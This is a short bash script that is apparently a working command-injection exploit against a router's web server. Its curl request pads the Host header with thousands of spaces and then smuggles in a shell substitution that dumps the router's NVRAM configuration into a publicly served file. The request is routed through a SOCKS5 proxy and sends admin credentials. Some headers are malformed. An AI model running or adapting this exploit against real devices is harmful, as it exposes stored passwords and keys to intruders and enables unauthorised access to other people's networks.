#!/bin/bash
#curl 'http://routerIP:8080' -H "Host: xxxxxxxxxxxxxx $(for i in $(seq 1 9700); do echo -n " "; done)  \$(nvram show > /www/user/nvram.css )"

curl 'http://routerIP:8080' -x socks5://locahost:889 -H "Host: xxxxxxxxxxxxxx $(for i in $(seq 1 9700); do echo -n " "; done)  \$(nvram show > /www/user/nvram.css )" -H 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36' -H Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8' -H Accept-Language: es-ES,es:q=0.5' --compressed -H "Authorization: Basic $((echo -ne 'admin:test'; ) | base64 -w 0 )"

